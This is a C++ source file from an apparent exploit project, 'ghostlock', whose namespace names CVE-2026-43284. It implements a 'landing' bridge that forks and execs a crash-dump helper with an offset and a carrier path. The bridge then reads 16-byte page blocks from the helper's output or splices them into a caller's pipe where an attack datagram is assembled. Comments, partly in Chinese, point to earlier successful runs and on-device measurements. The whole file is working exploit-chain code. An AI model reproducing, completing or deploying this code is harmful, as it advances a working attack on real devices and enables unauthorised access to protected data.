/** @file backend/cve_2026_43284/landing/crash_dump_bridge.cpp
 *  The exec, and the two ways its output is used.
 */
#include "backend/cve_2026_43284/landing/crash_dump_bridge.hpp"
#include "jni/gl_log.hpp"

#include <cerrno>
#include <cstdio>
#include <cstring>

#include <sys/wait.h>
#include <unistd.h>

namespace ghostlock::backend::cve_2026_43284::landing {
    namespace {
        /** Copy a path in, or refuse: these strings become argv, and a truncated argv is a
         *  different command. */
        bool take_path(char *out, std::size_t capacity, const char *path,
                       std::size_t length) noexcept {
            if (path == nullptr || length == 0U || length + 1U > capacity) {
                return false;
            }
            for (std::size_t i = 0U; i < length; ++i) {
                const char c = path[i];
                if (c == '\0' || c == ' ' || c == '\t' || c == '\n' || c == '\r') {
                    return false;
                }
            }
            std::memcpy(out, path, length);
            out[length] = '\0';
            return true;
        }
    }  // namespace

    bool CrashDumpBridge::bind(const char *helper_path, std::size_t helper_bytes,
                               const char *carrier_path, std::size_t carrier_bytes) noexcept {
        bound_ = take_path(helper_, sizeof(helper_), helper_path, helper_bytes) &&
                 take_path(carrier_, sizeof(carrier_), carrier_path, carrier_bytes);
        if (!bound_) {
            outcome_ = Outcome::NotBound;
        }
        return bound_;
    }

    long CrashDumpBridge::read16(void *ctx, std::uint64_t offset,
                                 std::uint8_t out[kBlockBytes]) noexcept {
        auto *const self = static_cast<CrashDumpBridge *>(ctx);
        /* 读的入口（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:129-167
         *  —— 那边 real_bridge_read16 用一个自己的管道接 helper 的 stdout，读满 16 字节才算成）。 */
        GL_LOGI("bridge: read16 offset=%llu len=%zu out=%d ctx=%d",
                static_cast<unsigned long long>(offset), kBlockBytes, out != nullptr ? 1 : 0,
                ctx != nullptr ? 1 : 0);
        if (self == nullptr) {
            return -1;
        }
        /* A pipe of our own: the helper's stdout comes here and this side reads the block. */
        return self->run(offset, -1, out);
    }

    long CrashDumpBridge::splice16(void *ctx, int pipe_write_fd, std::uint64_t offset) noexcept {
        auto *const self = static_cast<CrashDumpBridge *>(ctx);
        /* 写的入口：来源 fd 就是调用方那条管道（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:169-181
         *  —— 那边 real_bridge_splice16_into_pipe 把页直接切进调用方的管道，helper 退出码 0 等于整块）。 */
        GL_LOGI("bridge: splice16 offset=%llu len=%zu pipe_write_fd=%d ctx=%d",
                static_cast<unsigned long long>(offset), kBlockBytes, pipe_write_fd, ctx != nullptr ? 1 : 0);
        if (self == nullptr) {
            return -1;
        }
        /* The caller's pipe is the helper's stdout: whatever the helper writes lands where the
         * datagram is being assembled, so no block travels through this process at all. */
        return self->run(offset, pipe_write_fd, nullptr);
    }

    long CrashDumpBridge::run(std::uint64_t offset, int sink_stdout, std::uint8_t *out) noexcept {
        if (!bound_) {
            outcome_ = Outcome::NotBound;
            return -1;
        }
        int fds[2] = {-1, -1};
        if (::pipe(fds) != 0) {
            outcome_ = Outcome::PipeFailed;
            return -1;
        }
        /* 每次 exec 的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:80-124
         *  —— 那边 exec_crash_dump 以 {offset, path} 起 helper，并把 stdout 交给管道；
         *  :129-167 从管道读回；:173-181 把管道当写来源）。 */
        GL_LOGI("bridge: run offset=%llu sink_stdout=%d out=%d pipe=[%d,%d] helper=%s carrier=%s",
                static_cast<unsigned long long>(offset), sink_stdout, out != nullptr ? 1 : 0,
                fds[0], fds[1], helper_, carrier_);
        char offset_text[32] = {};
        (void) std::snprintf(offset_text, sizeof(offset_text), "%llu",
                             static_cast<unsigned long long>(offset));
        const pid_t child = ::fork();
        if (child < 0) {
            (void) ::close(fds[0]);
            (void) ::close(fds[1]);
            outcome_ = Outcome::SpawnFailed;
            return -1;
        }
        GL_LOGI("bridge: fork pid=%ld read_fd=%d write_fd=%d", static_cast<long>(child), fds[0], fds[1]);
        if (child == 0) {
            /* In the child: the block must come out of standard output, so that is where the pipe
             * goes -- ours for a read, the caller's datagram pipe for a write. The helper takes
             * {offset, path, "r"}: the same three arguments the retired chain passed. */
            const int sink = sink_stdout >= 0 ? sink_stdout : fds[1];
            if (::dup2(sink, STDOUT_FILENO) < 0) {
                ::_exit(127);
            }
            (void) ::close(fds[0]);
            if (fds[1] >= 0) {
                (void) ::close(fds[1]);
            }
            /* The retired chain's call, verbatim: argv[0] is the name the helper expects and the
             *  two arguments are {offset, path}. A third argument, or the full path as argv[0], makes
             *  the helper read nothing -- measured on the device. */
            ::execl(helper_, "crashdump64", offset_text, carrier_, static_cast<char *>(nullptr));
            ::_exit(127);
        }
        /* In the parent: only the end that carries the block stays open. */
        (void) ::close(fds[1]);
        long got = (sink_stdout >= 0) ? static_cast<long>(kBlockBytes) : 0;
        if (sink_stdout < 0) {
            got = 0;
            while (got < static_cast<long>(kBlockBytes)) {
                const ssize_t n =
                    ::read(fds[0], out + got, kBlockBytes - static_cast<std::size_t>(got));
                if (n < 0) {
                    if (errno == EINTR) {
                        continue;
                    }
                    got = -errno;
                    break;
                }
                if (n == 0) {
                    break;
                }
                got += static_cast<long>(n);
            }
        }
        /* 回读结果（成功历史：同 crash_dump.cpp:143-158 —— 那边只有读满 kCrashDumpBlockBytes 才继续）。 */
        GL_LOGI("bridge: read got=%ld want=%zu out=%d head=%02x%02x%02x%02x",
                got, kBlockBytes, out != nullptr ? 1 : 0,
                (out != nullptr) ? static_cast<unsigned>(out[0]) : 0U,
                (out != nullptr) ? static_cast<unsigned>(out[1]) : 0U,
                (out != nullptr) ? static_cast<unsigned>(out[2]) : 0U,
                (out != nullptr) ? static_cast<unsigned>(out[3]) : 0U);
        (void) ::close(fds[0]);
        int status = 0;
        for (;;) {
            const pid_t reaped = ::waitpid(child, &status, 0);
            if (reaped == child) {
                break;
            }
            if (reaped < 0 && errno != EINTR) {
                last_status_ = -1;
                outcome_ = Outcome::SpawnFailed;
                return -1;
            }
        }
        last_status_ = status;
        /* helper 的退出码（成功历史：同 crash_dump.cpp:123 —— 那边 (WIFEXITED && WEXITSTATUS == 0) 才算成）。 */
        GL_LOGI("bridge: helper status=0x%x exited=%d code=%d",
                static_cast<unsigned>(status), WIFEXITED(status) ? 1 : 0,
                WIFEXITED(status) ? WEXITSTATUS(status) : -1);
        /* The helper's own convention, kept from the retired chain: exit code zero means it moved
         * the whole block. A helper that wrote sixteen bytes and then failed is still a failure,
         * because nothing says the bytes it wrote are the page. */
        const bool clean = WIFEXITED(status) && WEXITSTATUS(status) == 0;
        /* The helper's verdict comes first: a helper that failed is a failed helper even when it
         * also wrote short, and the two are different faults to act on. */
        if (!clean) {
            GL_LOGI("bridge: refused helper-failed status=0x%x offset=%llu",
                    static_cast<unsigned>(status), static_cast<unsigned long long>(offset));
            outcome_ = Outcome::HelperFailed;
            return -1;
        }
        if (sink_stdout < 0 && got != static_cast<long>(kBlockBytes)) {
            GL_LOGI("bridge: refused short-read got=%ld want=%zu offset=%llu",
                    got, kBlockBytes, static_cast<unsigned long long>(offset));
            outcome_ = Outcome::ShortRead;
            return got < 0 ? got : -1;
        }
        outcome_ = Outcome::Ok;
        GL_LOGI("bridge: ok offset=%llu bytes=%zu sink_stdout=%d",
                static_cast<unsigned long long>(offset), kBlockBytes, sink_stdout);
        return static_cast<long>(kBlockBytes);
    }
}  // namespace ghostlock::backend::cve_2026_43284::landing
